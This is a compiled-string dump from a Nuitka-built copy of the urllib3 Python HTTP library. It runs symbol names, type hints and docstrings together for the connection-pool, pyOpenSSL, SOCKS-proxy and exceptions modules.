    aUrlTaschemeahostaportapathuReturns the URL from a given connection pool. This is mainly used for testing and logging.TFTablockuDrains a queue of connections and closes each one.a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaloggingasysatypingasocketaTracebackTypea_base_connectionTa_TYPE_BODYa_TYPE_BODYa_collectionsTaHTTPHeaderDicta_request_methodsTaRequestMethodsaconnectionTaBaseSSLErroraBrokenPipeErroraDummyConnectionaHTTPConnectionaHTTPExceptionaHTTPSConnectionaProxyConfiga_wrap_proxy_erroraHTTPConnectionaHTTPSConnectionaProxyConfigTaport_by_schemeaexceptionsT
aClosedPoolErroraEmptyPoolErroraFullPoolErroraHostChangedErroraInsecureRequestWarningaLocationValueErroraMaxRetryErroraNewConnectionErroraProtocolErroraProxyErroraReadTimeoutErroraSSLErroraTimeoutErrorTaBaseHTTPResponseaBaseHTTPResponseuutil.connectionTais_connection_droppeduutil.proxyTaconnection_requires_http_tunneluutil.requestTa_TYPE_BODY_POSITIONaset_file_positiona_TYPE_BODY_POSITIONuutil.retryTaRetryuutil.ssl_match_hostnameTaCertificateErroruutil.timeoutTa_DEFAULT_TIMEOUTa_TYPE_DEFAULTaTimeouta_TYPE_DEFAULTuutil.urlTaUrla_encode_targetTa_normalize_hostTaparse_urluutil.utilTato_stragetLoggerTuurllib3.connectionpoolaUniona_TYPE_TIMEOUTuurllib3.connectionpoola__module__u
    Base class for all connection pools, such as
    :class:`.HTTPConnectionPool` and :class:`.HTTPSConnectionPool`.

    .. note::
       ConnectionPool.urlopen() does not normalize or percent-encode target URIs
       which is useful if your target server doesn't support percent-encoded
       target URIs.
    a__qualname__a__annotations__ustr | NoneaLifoQueueDahostaportareturnastruint | NoneaNoneuConnectionPool.__init__Dareturnastra__str__uConnectionPool.__str__DareturnaSelfa__enter__uConnectionPool.__enter__Daexc_typeaexc_valaexc_tbareturnutype[BaseException] | NoneuBaseException | NoneuTracebackType | Noneutyping.Literal[False]a__exit__uConnectionPool.__exit__DareturnaNoneuConnectionPool.closeaEAGAINaEWOULDBLOCKa__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %su<metaclass>u
    Thread-safe connection pool for one host.

    :param host:
        Host used for this HTTP Connection (e.g. "localhost"), passed into
        :class:`http.client.HTTPConnection`.

    :param port:
        Port used for this HTTP Connection (None is equivalent to 80), passed
        into :class:`http.client.HTTPConnection`.

    :param timeout:
        Socket timeout in seconds for each individual connection. This can
        be a float or integer, which sets the timeout for the HTTP request,
        or an instance of :class:`urllib3.util.Timeout` which gives you more
        fine-grained control over request timeouts. After the constructor has
        been parsed, this is always a `urllib3.util.Timeout` object.

    :param maxsize:
        Number of connections to save that can be reused. More than 1 is useful
        in multithreaded situations. If ``block`` is set to False, more
        connections will be created but they will not be saved once they've
        been used.

    :param block:
        If set to True, no more than ``maxsize`` connections will be used at
        a time. When no free connections are available, the call will block
        until a connection has been released. This is a useful side effect for
        particular multithreaded situations where one does not want to use more
        than maxsize connections per host to prevent flooding.

    :param headers:
        Headers to include with all requests, unless other headers are given
        explicitly.

    :param retries:
        Retry configuration to use by default with requests in this pool.

    :param _proxy:
        Parsed proxy URL, should not be used directly, instead, see
        :class:`urllib3.ProxyManager`

    :param _proxy_headers:
        A dictionary with proxy headers, should not be used directly,
        instead, see :class:`urllib3.ProxyManager`

    :param \**conn_kw:
        Additional parameters are used to create fresh :class:`urllib3.connection.HTTPConnection`,
        :class:`urllib3.connection.HTTPSConnection` instances.
    utype[BaseHTTPConnection] | type[BaseHTTPSConnection]Dahostaportatimeoutamaxsizeablockaheadersaretriesa_proxya_proxy_headersa_proxy_configaconn_kwastruint | Noneu_TYPE_TIMEOUT | Noneaintaboolutyping.Mapping[str, str] | NoneuRetry | bool | int | NoneuUrl | Noneutyping.Mapping[str, str] | NoneuProxyConfig | Noneutyping.AnyuHTTPConnectionPool.__init__DareturnaBaseHTTPConnectionuHTTPConnectionPool._new_connDatimeoutareturnufloat | NoneaBaseHTTPConnectionuHTTPConnectionPool._get_connDaconnareturnuBaseHTTPConnection | NoneaNoneuHTTPConnectionPool._put_connDaconnareturnaBaseHTTPConnectionaNoneuHTTPConnectionPool._validate_connuHTTPConnectionPool._prepare_proxyDatimeoutareturna_TYPE_TIMEOUTaTimeoutuHTTPConnectionPool._get_timeoutDaerraurlatimeout_valueareturnuBaseSSLError | OSError | SocketTimeoutastru_TYPE_TIMEOUT | NoneaNoneuHTTPConnectionPool._raise_timeoutD
aconnamethodaurlabodyaheadersaretriesatimeoutachunkedaresponse_connapreload_contentadecode_contentaenforce_content_lengthareturnaBaseHTTPConnectionastrpu_TYPE_BODY | Noneutyping.Mapping[str, str] | NoneuRetry | Nonea_TYPE_TIMEOUTabooluBaseHTTPConnection | NoneaboolppaBaseHTTPResponseuHTTPConnectionPool._make_requestuHTTPConnectionPool.closeDaurlareturnastrabooluHTTPConnectionPool.is_same_hostDamethodaurlabodyaheadersaretriesaredirectaassert_same_hostatimeoutapool_timeoutarelease_connachunkedabody_posapreload_contentadecode_contentaresponse_kwareturnastrpu_TYPE_BODY | Noneutyping.Mapping[str, str] | NoneuRetry | bool | int | Noneaboolpa_TYPE_TIMEOUTuint | Noneubool | Noneaboolu_TYPE_BODY_POSITION | Noneaboolputyping.AnyaBaseHTTPResponseuHTTPConnectionPool.urlopena__orig_bases__u
    Same as :class:`.HTTPConnectionPool`, but HTTPS.

    :class:`.HTTPSConnection` uses one of ``assert_fingerprint``,
    ``assert_hostname`` and ``host`` in this order to verify connections.
    If ``assert_hostname`` is False, no verification is done.

    The ``key_file``, ``cert_file``, ``cert_reqs``, ``ca_certs``,
    ``ca_cert_dir``, ``ssl_version``, ``key_password`` are only used if :mod:`ssl`
    is available and are fed into :meth:`urllib3.util.ssl_wrap_socket` to upgrade
    the connection socket into an SSL socket.
    utype[BaseHTTPSConnection]Dahostaportatimeoutamaxsizeablockaheadersaretriesa_proxya_proxy_headersakey_fileacert_fileacert_reqsakey_passwordaca_certsassl_versionassl_minimum_versionassl_maximum_versionaassert_hostnameaassert_fingerprintaca_cert_diraconn_kwareturnastruint | Noneu_TYPE_TIMEOUT | Noneaintaboolutyping.Mapping[str, str] | NoneuRetry | bool | int | NoneuUrl | Noneutyping.Mapping[str, str] | Noneustr | Noneustr | Noneuint | str | Noneustr | Noneustr | Noneuint | str | Noneussl.TLSVersion | Noneussl.TLSVersion | Noneustr | typing.Literal[False] | Noneustr | Noneustr | Noneutyping.AnyaNoneuHTTPSConnectionPool.__init__DaconnareturnaHTTPSConnectionaNoneuHTTPSConnectionPool._prepare_proxyDareturnaBaseHTTPSConnectionuHTTPSConnectionPool._new_connuHTTPSConnectionPool._validate_connDaurlakwareturnastrutyping.AnyaHTTPConnectionPoolaconnection_from_urlaoverloadDahostaschemeareturnaNoneustr | NoneaNoneDahostaschemeareturnastrustr | NoneastrDahostaschemeareturnustr | Noneustr | Noneustr | NoneDapoolapathareturnuHTTPConnectionPool | HTTPSConnectionPoolustr | Noneastra_url_from_poolDapoolareturnuqueue.LifoQueue[typing.Any]aNoneuurllib3\connectionpool.pyu<module urllib3.connectionpool>Ta__class__TaselfTaselfaexc_typeaexc_valaexc_tbTaselfahostaportTaselfahostaportatimeoutamaxsizeablockaheadersaretriesa_proxya_proxy_headersa_proxy_configaconn_kww_apoolTaselfahostaportatimeoutamaxsizeablockaheadersaretriesa_proxya_proxy_headersakey_fileacert_fileacert_reqsakey_passwordaca_certsassl_versionassl_minimum_versionassl_maximum_versionaassert_hostnameaassert_fingerprintaca_cert_diraconn_kwa__class__TapoolaconnTaselfatimeoutaconnTaselfatimeoutTaselfaconnamethodaurlabodyaheadersaretriesatimeoutachunkedaresponse_connapreload_contentadecode_contentaenforce_content_lengthanew_eatimeout_objwearead_timeoutaresponseTaselfaconnTaselfaactual_hostaactual_portTahostaschemeTaselfaconnatunnel_schemeTaselfaerraurlatimeout_valueTapoolapathTaselfaconna__class__Taselfaold_poolTaurlakwaschemew_ahostaportTaselfaurlaschemew_ahostaportTaselfamethodaurlabodyaheadersaretriesaredirectaassert_same_hostatimeoutapool_timeoutarelease_connachunkedabody_posapreload_contentadecode_contentaresponse_kwanew_eaparsed_urladestination_schemeaconnarelease_this_connahttp_tunnel_requiredaerraclean_exitatimeout_objwearesponse_connaresponsearedirect_locationahas_retry_after.urllib3]saloggingagetLoggerTaurllib3aStreamHandlerasetFormatteraFormatterTu%(asctime)s %(levelname)s %(message)saaddHandlerasetLeveladebugTuAdded a stderr logging handler to logger: %saurllib3u
    Helper for quickly adding a StreamHandler to the logger. Useful for
    debugging.

    Returns the handler after adding it.
    awarningsasimplefilteraignoreu
    Helper for quickly disabling all urllib3 warnings.
    a_DEFAULT_POOLarequestTabodyafieldsaheadersapreload_contentadecode_contentaredirectaretriesatimeoutajsonu
    A convenience, top-level request method. It uses a module-global ``PoolManager`` instance.
    Therefore, its side effects could be shared across dependencies relying on it.
    To avoid side effects create a new ``PoolManager`` instance and use it instead.
    The method does not accept low-level ``**urlopen_kw`` keyword arguments.

    :param method:
        HTTP request method (such as GET, POST, PUT, etc.)

    :param url:
        The URL to perform the request on.

    :param body:
        Data to send in the request body, either :class:`str`, :class:`bytes`,
        an iterable of :class:`str`/:class:`bytes`, or a file-like object.

    :param fields:
        Data to encode and send in the request body.

    :param headers:
        Dictionary of custom headers to send, such as User-Agent,
        If-None-Match, etc.

    :param bool preload_content:
        If True, the response's body will be preloaded into memory.

    :param bool decode_content:
        If True, will attempt to decode the body based on the
        'content-encoding' header.

    :param redirect:
        If True, automatically handle redirects (status codes 301, 302,
        303, 307, 308). Each redirect counts as a retry. Disabling retries
        will disable redirect, too.

    :param retries:
        Configure the number of retries to allow before raising a
        :class:`~urllib3.exceptions.MaxRetryError` exception.

        If ``None`` (default) will retry 3 times, see ``Retry.DEFAULT``. Pass a
        :class:`~urllib3.util.retry.Retry` object for fine-grained control
        over different types of retries.
        Pass an integer number to retry connection errors that many times,
        but no other types of errors. Pass zero to never retry.

        If ``False``, then retries are disabled and any exception is raised
        immediately. Also, instead of raising a MaxRetryError on redirects,
        the redirect response will be returned.

    :type retries: :class:`~urllib3.util.retry.Retry`, False, or an int.

    :param timeout:
        If specified, overrides the default timeout for this one
        request. It may be a float (in seconds) or an instance of
        :class:`urllib3.util.Timeout`.

    :param json:
        Data to encode and send as JSON with UTF-encoded in the request body.
        The ``"Content-Type"`` header will be set to ``"application/json"``
        unless specified otherwise.
    u
Python HTTP library with thread-safe connection pooling, file post support, user friendly, and more
a__doc__a__file__apathadirnameaenvironagetTaNUITKA_PACKAGE_urllib3u\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__aannotationslasysatypingTaNullHandleraNullHandleruTaexceptionslaexceptionsa_base_connectionTa_TYPE_BODYa_TYPE_BODYa_collectionsTaHTTPHeaderDictaHTTPHeaderDicta_versionTa__version__a__version__aconnectionpoolTaHTTPConnectionPoolaHTTPSConnectionPoolaconnection_from_urlaHTTPConnectionPoolaHTTPSConnectionPoolaconnection_from_urlafilepostTa_TYPE_FIELDSaencode_multipart_formdataa_TYPE_FIELDSaencode_multipart_formdataapoolmanagerTaPoolManageraProxyManageraproxy_from_urlaPoolManageraProxyManageraproxy_from_urlaresponseTaBaseHTTPResponseaHTTPResponseaBaseHTTPResponseaHTTPResponseuutil.requestTamake_headersamake_headersuutil.retryTaRetryaRetryuutil.timeoutTaTimeoutaTimeoutasslaOPENSSL_VERSIONastartswithTuOpenSSL awarnuurllib3 v2 only supports OpenSSL 1.1.1+, currently the 'ssl' module is compiled with u. See: https://github.com/urllib3/urllib3/issues/3020aNotOpenSSLWarningaOPENSSL_VERSION_INFOTlppu. See: https://github.com/urllib3/urllib3/issues/2168uAndrey Petrov (andrey.petrov@shazow.net)a__author__aMITa__license__TaHTTPConnectionPoolaHTTPHeaderDictaHTTPSConnectionPoolaPoolManageraProxyManageraHTTPResponseaRetryaTimeoutaadd_stderr_loggeraconnection_from_urladisable_warningsaencode_multipart_formdataamake_headersaproxy_from_urlarequestaBaseHTTPResponsea__all__aDEBUGDalevelareturnaintulogging.StreamHandler[typing.TextIO]aadd_stderr_loggeraalwaysaSecurityWarningDaappendtadefaultaInsecurePlatformWarningaHTTPWarningDacategoryareturnutype[Warning]aNoneadisable_warningsDabodyafieldsaheadersapreload_contentadecode_contentaredirectaretriesatimeoutajsonnnntppnlnDamethodaurlabodyafieldsaheadersapreload_contentadecode_contentaredirectaretriesatimeoutajsonareturnastrpu_TYPE_BODY | Noneu_TYPE_FIELDS | Noneutyping.Mapping[str, str] | Noneubool | Noneubool | Noneubool | NoneuRetry | bool | int | NoneuTimeout | float | int | Noneutyping.Any | NoneaBaseHTTPResponseuurllib3\__init__.pyu<module urllib3>TalevelaloggerahandlerTacategoryTamethodaurlabodyafieldsaheadersapreload_contentadecode_contentaredirectaretriesatimeoutajson.urllib3.contrib'a__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_urllib3u\not_existingacontribTaNUITKA_PACKAGE_urllib3_contribu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__uurllib3\contrib\__init__.pyu<module urllib3.contrib>u.urllib3.contrib.pyopenssl#Ia_validate_dependencies_metaPyOpenSSLContextautilaSSLContextassl_aIS_PYOPENSSLuMonkey-patch urllib3 with PyOpenSSL-backed SSL-support.aorig_util_SSLContextuUndo monkey-patching by :func:`inject_into_urllib3`.ucryptography.x509.extensionsTaExtensionslaExtensionsaget_extension_for_classu'cryptography' module missing required functionality.  Try upgrading to v1.3.4 or newer.uOpenSSL.cryptoTaX509aX509a_x509u'pyOpenSSL' module missing required functionality. Try upgrading to v0.14 or newer.u
    Verifies that PyOpenSSL's package-level dependencies have been met.
    Throws `ImportError` if they are not met.
    Danameareturnastrubytes | Noneu
        Borrowed wholesale from the Python Cryptography Project. It turns out
        that we can't just safely call `idna.encode`: it can explode for
        wildcard names. This avoids that problem.
        aidna_encodeu_dnsname_to_stdlib.<locals>.idna_encodew:adecodeTuutf-8u
    Converts a dNSName SubjectAlternativeName field to the form used by the
    standard library on the given Python version.

    Cryptography produces a dNSName as a unicode string that was idna-decoded
    from ASCII bytes. We need to idna-encode that string to get it back, and
    then on Python 3 we also need to convert to unicode via UTF-8 (the stdlib
    uses PyUnicode_FromStringAndSize on it, which decodes via UTF-8).

    If the name cannot be idna-encoded then we return None signalling that
    the name given should be skipped.
    aidnaTu*.w.anameastartswithaencodeTaasciiacoreaIDNAErrorato_cryptographyaextensionsax509aSubjectAlternativeNameavalueaExtensionNotFoundaDuplicateExtensionaUnsupportedExtensionaUnsupportedGeneralNameTypealogawarninguA problem was encountered with the certificate that prevented urllib3 from finding the SubjectAlternativeName field. This can affect certificate validation. The error was %sa_dnsname_to_stdlibaget_values_for_typeaDNSNameaDNSaextendaIPAddressu
    Given an PyOpenSSL certificate, provides all the subject alternative names.
    uIP Addressu<genexpr>uget_subj_alt_name.<locals>.<genexpr>aconnectionasocketasuppress_ragged_eofsa_io_refsa_closedafilenolaclosearecvaOpenSSLaSSLaSysCallErroraargsTquUnexpected EOFcaZeroReturnErroraget_shutdownaRECEIVED_SHUTDOWNaWantReadErrorawait_for_readagettimeoutatimeoutTuThe read operation timed outaErrorasslaSSLErroruread error: uarecv_intoasettimeoutaselfasendadataaWantWriteErrorawait_for_writeatotal_senta_send_until_doneaSSL_WRITE_BLOCKSIZEashutdowna_real_closeaget_peer_certificateacryptoadump_certificateaFILETYPE_ASN1asubjectacommonNameaget_subjectaCNasubjectAltNameaget_subj_alt_nameaget_protocol_version_nameaget_alpn_proto_negotiateda_openssl_versionsaprotocolaContexta_ctxa_optionsacheck_hostnameaTLSVersionaMINIMUM_SUPPORTEDa_minimum_versionaMAXIMUM_SUPPORTEDa_maximum_versiona_set_ctx_optionsa_openssl_to_stdlib_verifyaget_verify_modeaset_verifya_stdlib_to_openssl_verifya_verify_callbackaset_default_verify_pathsaset_cipher_listaload_verify_locationsaBytesIOuunable to load trusted certificates: ause_certificate_chain_fileaset_passwd_cbu<lambda>uPyOpenSSLContext.load_cert_chain.<locals>.<lambda>ause_privatekey_fileuUnable to load certificate chain: apasswordato_bytesaasciiaset_alpn_protosaConnectionais_ipaddressaset_tlsext_host_nameaserver_hostnameaset_connect_stateacnxado_handshakeasockTuselect timed outubad handshake: aWrappedSocketaset_optionsa_openssl_to_ssl_minimum_versiona_openssl_to_ssl_maximum_versionu
Module for using pyOpenSSL as a TLS backend. This module was relevant before
the standard library ``ssl`` module supported SNI, but now that we've dropped
support for Python 2.7 all relevant Python versions support SNI so
**this module is no longer recommended**.

This needs the following packages installed:

* `pyOpenSSL`_ (tested with 16.0.0)
* `cryptography`_ (minimum 1.3.4, from pyopenssl)
* `idna`_ (minimum 2.0)

However, pyOpenSSL depends on cryptography, so while we use all three directly here we
end up having relatively few packages required.

You can install them with the following command:

.. code-block:: bash

    $ python -m pip install pyopenssl cryptography idna

To activate certificate checking, call
:func:`~urllib3.contrib.pyopenssl.inject_into_urllib3` from your Python code
before you begin making HTTP requests. This can be done in a ``sitecustomize``
module, or at any other time before your application begins using ``urllib3``,
like this:

.. code-block:: python

    try:
        import urllib3.contrib.pyopenssl
        urllib3.contrib.pyopenssl.inject_into_urllib3()
    except ImportError:
        pass

.. _pyopenssl: https://www.pyopenssl.org
.. _cryptography: https://cryptography.io
.. _idna: https://github.com/kjd/idna
a__doc__a__file__a__spec__aoriginahas_locationa__cached__a__annotations__aannotationsuOpenSSL.SSLacryptographyTax509ucryptography.x509TaUnsupportedExtensionTEExceptiona__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uurllib3.contrib.pyopenssla__module__a__qualname__a__orig_bases__aloggingatypingTasocketasocket_clsTatimeoutTautillainject_into_urllib3aextract_from_urllib3a__all__aPROTOCOL_TLSaSSLv23_METHODaPROTOCOL_TLS_CLIENTaPROTOCOL_TLSv1aTLSv1_METHODudict[int, int]aPROTOCOL_TLSv1_1aTLSv1_1_METHODaPROTOCOL_TLSv1_2aTLSv1_2_METHODaCERT_NONEaVERIFY_NONEaCERT_OPTIONALaVERIFY_PEERaCERT_REQUIREDaVERIFY_FAIL_IF_NO_PEER_CERTutoo many values to unpack (expected 2)aOP_NO_SSLv2aOP_NO_SSLv3a_OP_NO_SSLv2_OR_SSLv3aintaOP_NO_TLSv1a_OP_NO_TLSv1aOP_NO_TLSv1_1a_OP_NO_TLSv1_1aOP_NO_TLSv1_2a_OP_NO_TLSv1_2aOP_NO_TLSv1_3a_OP_NO_TLSv1_3aTLSv1aTLSv1_1aTLSv1_2aTLSv1_3lagetLoggerTuurllib3.contrib.pyopensslDareturnaNoneDanameareturnastrustr | NoneDapeer_certareturnaX509ulist[tuple[str, str]]uAPI-compatibility wrapper for Python OpenSSL's Connection-class.TtDaconnectionasocketasuppress_ragged_eofsareturnuOpenSSL.SSL.Connectionasocket_clsaboolaNonea__init__uWrappedSocket.__init__DareturnaintuWrappedSocket.filenoa_decref_socketiosuWrappedSocket._decref_socketiosDaargsakwargsareturnutyping.Anyutyping.AnyabytesuWrappedSocket.recvDaargsakwargsareturnutyping.Anyutyping.AnyaintuWrappedSocket.recv_intoDatimeoutareturnafloataNoneuWrappedSocket.settimeoutDadataareturnabytesaintuWrappedSocket._send_until_doneDadataareturnabytesaNoneasendalluWrappedSocket.sendalluWrappedSocket.shutdownuWrappedSocket.closeuWrappedSocket._real_closeTFDabinary_formareturnabooludict[str, list[typing.Any]] | NoneagetpeercertuWrappedSocket.getpeercertDareturnastraversionuWrappedSocket.versionDareturnustr | Noneaselected_alpn_protocoluWrappedSocket.selected_alpn_protocolamakefileu
    I am a wrapper class for the PyOpenSSL ``Context`` object. I am responsible
    for translating the interface of the standard library ``SSLContext`` object
    to calls into PyOpenSSL.
    DaprotocolareturnaintaNoneuPyOpenSSLContext.__init__aoptionsuPyOpenSSLContext.optionsasetterDavalueareturnaintaNoneaverify_modeuPyOpenSSLContext.verify_modeDavalueareturnussl.VerifyModeaNoneuPyOpenSSLContext.set_default_verify_pathsDaciphersareturnubytes | straNoneaset_ciphersuPyOpenSSLContext.set_ciphersTnnnDacafileacapathacadataareturnustr | Noneustr | Noneubytes | NoneaNoneuPyOpenSSLContext.load_verify_locationsTnnDacertfileakeyfileapasswordareturnastrustr | Noneustr | NoneaNoneaload_cert_chainuPyOpenSSLContext.load_cert_chainDaprotocolsareturnulist[bytes | str]aNoneaset_alpn_protocolsuPyOpenSSLContext.set_alpn_protocolsTFtpnDasockaserver_sideado_handshake_on_connectasuppress_ragged_eofsaserver_hostnameareturnasocket_clsaboolppubytes | str | NoneaWrappedSocketawrap_socketuPyOpenSSLContext.wrap_socketuPyOpenSSLContext._set_ctx_optionsaminimum_versionuPyOpenSSLContext.minimum_versionDaminimum_versionareturnaintaNoneamaximum_versionuPyOpenSSLContext.maximum_versionDamaximum_versionareturnaintaNoneDacnxax509aerr_noaerr_depthareturn_codeareturnuOpenSSL.SSL.ConnectionaX509aintppabooluurllib3\contrib\pyopenssl.pyTa.0anameTw_apasswordTapasswordu<module urllib3.contrib.pyopenssl>Ta__class__TaselfaprotocolTaselfaconnectionasocketasuppress_ragged_eofsTaselfTanameaidna_encodeaencoded_nameTaselfadataweTaExtensionsaX509ax509Tacnxax509aerr_noaerr_depthareturn_codeTapeer_certacertaextweanamesTaselfabinary_formax509TanameaidnaaprefixTaselfacertfileakeyfileapasswordweTaselfacafileacapathacadataweTaselfamaximum_versionTaselfaminimum_versionTaselfavalueTaselfaargsakwargsadataweTaselfaargsakwargsweTaselfaalpn_protoTaselfadataatotal_sentasentTaselfaprotocolsTaselfaciphersTaselfatimeoutTaselfasockaserver_sideado_handshake_on_connectasuppress_ragged_eofsaserver_hostnameacnxwe.urllib3.contrib.socksxa_socks_optionsa__class__a__init__asource_addressasocket_optionsasocksacreate_connectionahostaportaproxy_typeasocks_versionaproxy_addraproxy_hostaproxy_portaproxy_usernameausernameaproxy_passwordapasswordaproxy_rdnsardnsatimeoutaSocketTimeoutaConnectTimeoutErroruConnection to uu timed out. (connect timeout=w)aProxyErrorasocket_erraNewConnectionErroruFailed to establish a new connection: u
        Establish a new connection via the SOCKS proxy.
        aparse_urlaauthasplitTw:utoo many values to unpack (expected 2)aschemeasocks5aPROXY_TYPE_SOCKS5asocks5hasocks4aPROXY_TYPE_SOCKS4asocks4auUnable to determine SOCKS version from aproxy_urlaSOCKSProxyManagerapool_classes_by_schemeu
This module contains provisional support for SOCKS proxies from within
urllib3. This module supports SOCKS4, SOCKS4A (an extension of SOCKS4), and
SOCKS5. To enable its functionality, either install PySocks or install this
module with the ``socks`` extra.

The SOCKS implementation supports the full range of urllib3 features. It also
supports the following SOCKS features:

- SOCKS4A (``proxy_url='socks4a://...``)
- SOCKS4 (``proxy_url='socks4://...``)
- SOCKS5 with remote DNS (``proxy_url='socks5h://...``)
- SOCKS5 with local DNS (``proxy_url='socks5://...``)
- Usernames and passwords for the SOCKS proxy

.. note::
   It is recommended to use ``socks5h://`` or ``socks4a://`` schemes in
   your ``proxy_url`` to ensure that DNS resolution is done from the remote
   server instead of client-side when connecting to a domain name.

SOCKS4 supports IPv4 and domain names with the SOCKS4A extension. SOCKS5
supports IPv4, IPv6, and domain names.

When connecting to a SOCKS4 proxy the ``username`` portion of the ``proxy_url``
will be sent as the ``userid`` section of the SOCKS request:

.. code-block:: python

    proxy_url="socks4a://<userid>@proxy-host"

When connecting to a SOCKS5 proxy the ``username`` and ``password`` portion
of the ``proxy_url`` will be sent as the username/password to authenticate
with the proxy:

.. code-block:: python

    proxy_url="socks5h://<username>:<password>@proxy-host"

a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationslawarningsaexceptionsTaDependencyWarninglaDependencyWarningawarnuSOCKS support in urllib3 requires the installation of optional dependencies: specifically, PySocks.  For more information, see https://urllib3.readthedocs.io/en/latest/advanced-usage.html#socks-proxiesatypingasocketTatimeoutaconnectionTaHTTPConnectionaHTTPSConnectionaHTTPConnectionaHTTPSConnectionaconnectionpoolTaHTTPConnectionPoolaHTTPSConnectionPoolaHTTPConnectionPoolaHTTPSConnectionPoolTaConnectTimeoutErroraNewConnectionErrorapoolmanagerTaPoolManageraPoolManageruutil.urlTaparse_urlasslaTypedDicta__prepare__a_TYPE_SOCKS_OPTIONSa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uurllib3.contrib.socksa__module__a__qualname__a__annotations__aintustr | Noneaboola__orig_bases__aSOCKSConnectionu
    A plain-text HTTP connection that connects via a SOCKS proxy.
    Da_socks_optionsaargsakwargsareturna_TYPE_SOCKS_OPTIONSutyping.Anyutyping.AnyaNoneuSOCKSConnection.__init__Dareturnusocks.socksocketa_new_connuSOCKSConnection._new_connaSOCKSHTTPSConnectionaSOCKSHTTPConnectionPoolaConnectionClsaSOCKSHTTPSConnectionPoolu
    A version of the urllib3 ProxyManager that routes connections via the
    defined SOCKS proxy.
    ahttpahttpsTnnl
nDaproxy_urlausernameapasswordanum_poolsaheadersaconnection_pool_kwastrustr | Noneustr | Noneaintutyping.Mapping[str, str] | Noneutyping.AnyuSOCKSProxyManager.__init__uurllib3\contrib\socks.pyu<module urllib3.contrib.socks>Ta__class__Taselfa_socks_optionsaargsakwargsa__class__T
aselfaproxy_urlausernameapasswordanum_poolsaheadersaconnection_pool_kwaparsedasplitasocks_versionardnsasocks_optionsa__class__Taselfaextra_kwaconnweaerror.urllib3.exceptionsapoola__class__a__init__uu: Tnnaurlaoriginal_errorareasonuMax retries exceeded with url: u (Caused by w)uTried to open a foreign host with url: aretriesaconnawarningsawarnuThe 'pool' property is deprecated and will be removed in urllib3 v2.1.0. Use 'conn' instead.aDeprecationWarningDastacklevelluFailed to resolve 'u' (uFailed to parse: alocationuNot supported URL scheme aschemeapartialaexpecteduIncompleteRead(%i bytes read, %i more expected)atellalength_remainingaresponsealengthuInvalidChunkLength(got length %r, %i bytes read)alocalhostuProxy URL had no scheme, should start with http:// or https://uProxy URL had unsupported scheme u, should use http:// or https://aUnknownu, unparsed data: a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsasocketlatypinguemail.errorsTaMessageDefectaMessageDefectuhttp.clientTaIncompleteReadaIncompleteReadahttplib_IncompleteReadTEExceptiona__prepare__aHTTPErrora__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uurllib3.exceptionsa__module__uBase exception used by this module.a__qualname__a__orig_bases__aWarningaHTTPWarninguBase warning used by this module.aTupleaCallableTQOobjectTOobjectQa_TYPE_REDUCE_RESULTaPoolErroruBase exception for errors caused within a pool.DapoolamessageareturnaConnectionPoolastraNoneuPoolError.__init__Dareturna_TYPE_REDUCE_RESULTa__reduce__uPoolError.__reduce__aRequestErroruBase exception for PoolErrors that have associated URLs.DapoolaurlamessageareturnaConnectionPoolastrpaNoneuRequestError.__init__uRequestError.__reduce__aSSLErroruRaised when SSL certificate fails in an HTTPS connection.aProxyErroruRaised when the connection to a proxy fails.a__annotations__aExceptionDamessageaerrorareturnastraExceptionaNoneuProxyError.__init__aDecodeErroruRaised when automatic decoding based on Content-Type fails.aProtocolErroruRaised when something unexpected happens mid-request/response.aConnectionErroraMaxRetryErroruRaised when the maximum number of retries is exceeded.

    :param pool: The connection pool
    :type pool: :class:`~urllib3.connectionpool.HTTPConnectionPool`
    :param str url: The requested Url
    :param reason: The underlying error
    :type reason: :class:`Exception`

    TnDapoolaurlareasonareturnaConnectionPoolastruException | NoneaNoneuMaxRetryError.__init__aHostChangedErroruRaised when an existing pool gets a request for a foreign host.TlDapoolaurlaretriesareturnaConnectionPoolastruRetry | intaNoneuHostChangedError.__init__aTimeoutStateErroruRaised when passing an invalid state to a timeoutaTimeoutErroruRaised when a socket timeout error occurs.

    Catching this error will catch both :exc:`ReadTimeoutErrors
    <ReadTimeoutError>` and :exc:`ConnectTimeoutErrors <ConnectTimeoutError>`.
    aReadTimeoutErroruRaised when a socket timeout occurs while receiving data from a serveraConnectTimeoutErroruRaised when a socket timeout occurs while connecting to a serveraNewConnectionErroruRaised when we fail to establish a new connection. Usually ECONNREFUSED.DaconnamessageareturnaHTTPConnectionastraNoneuNewConnectionError.__init__apropertyDareturnaHTTPConnectionuNewConnectionError.poolaNameResolutionErroruRaised when host name resolution fails.DahostaconnareasonastraHTTPConnectionusocket.gaierroruNameResolutionError.__init__aEmptyPoolErroruRaised when a pool runs out of connections and no more are allowed.aFullPoolErroruRaised when we try to add a connection to a full pool in blocking mode.aClosedPoolErroruRaised when a request enters a pool after the pool has been closed.aLocationValueErroruRaised when there is something wrong with a given URL input.aLocationParseErroruRaised when get_host or similar fails to parse the URL input.DalocationareturnastraNoneuLocationParseError.__init__aURLSchemeUnknownuRaised when a URL input has an unsupported scheme.DaschemeastruURLSchemeUnknown.__init__aResponseErroruUsed as a container for an error reason supplied in a MaxRetryError.utoo many error responsesaGENERIC_ERRORutoo many {status_code} error responsesaSPECIFIC_ERRORaSecurityWarninguWarned when performing security reducing actionsaInsecureRequestWarninguWarned when making an unverified HTTPS request.aNotOpenSSLWarninguWarned when using unsupported SSL libraryaSystemTimeWarninguWarned when system time is suspected to be wrongaInsecurePlatformWarninguWarned when certain TLS/SSL configuration is not available on a platform.aDependencyWarningu
    Warned when an attempt is made to import a module with missing optional
    dependencies.
    aResponseNotChunkeduResponse needs to be chunked in order to read it as chunks.aBodyNotHttplibCompatibleu
    Body should be :class:`http.client.HTTPResponse` like
    (have an fp attribute which returns raw chunks) for read_chunked().
    u
    Response length doesn't match expected Content-Length

    Subclass of :class:`http.client.IncompleteRead` to allow int value
    for ``partial`` to avoid creating large objects on streamed reads.
